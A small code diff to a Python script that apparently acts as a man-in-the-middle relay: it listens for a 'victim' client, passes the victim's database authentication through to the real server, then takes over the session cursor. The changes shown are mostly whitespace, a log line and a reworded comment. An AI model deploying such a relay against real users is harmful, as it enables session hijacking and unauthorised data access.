@@ -45,10 +45,11 @@ def main(local_addr, server_addr):
     # prepare local sockets
     local_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    local_sock.bind(local_addr)
+    local_sock.bind(local_addr)    
     local_sock.listen(1)
-
-    # wait for a victim to connect here
+    
+    # wait for a victim to connect here    
+    logger.info("[*] WAITING FOR CLIENT...")
     client_connection, client_addr = local_sock.accept()
     logger.info('[*] CONNECTED BY: {}'.format(client_addr))
 
@@ -58,7 +59,7 @@ def main(local_addr, server_addr):
     server_connection = ConnectionWrapper(defer_connect=True)
     server_connection._sock = server_sock
     
-    # bypass authentication
+    # wait that the victim finish his authentication
     authenticate(client_connection, server_connection)
 
     # you can do everything here with cursor
